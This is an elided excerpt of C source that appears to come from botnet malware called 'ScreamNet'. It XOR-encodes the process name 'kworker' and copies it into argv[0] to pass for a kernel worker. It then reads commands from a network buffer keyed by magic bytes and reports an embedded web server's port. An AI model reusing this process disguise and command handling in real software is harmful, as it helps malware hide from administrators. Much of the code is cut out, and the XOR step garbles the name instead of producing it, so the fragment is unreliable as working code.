...
void encrypt_process(char* process_name, const char* key) {
    int len = strlen(process_name);
    int key_len = strlen(key);

    for (int i = 0; i < len; i++) {
        process_name[i] ^= key[i % key_len];
    }
}
...
int main(int argc, char **args)
{
    ...
    char process_name[256] = "kworker";
    const char key[] = "0xff34942f";

    encrypt_process(process_name, key);
    util_strcpy(args[0], process_name);
            ...
            if (n > 0)
            {
                ...
                else if(rdbuf[0] == '\x33' && rdbuf[1] == '\x66')
                {
                    if(rdbuf[2] == '\x99')
                    {
                        ...
                        if(httpd_started == 1)
                        {
                            sprintf(tmpbuf, "ScreamNet %s:%d", WEBBY, httpd_port);
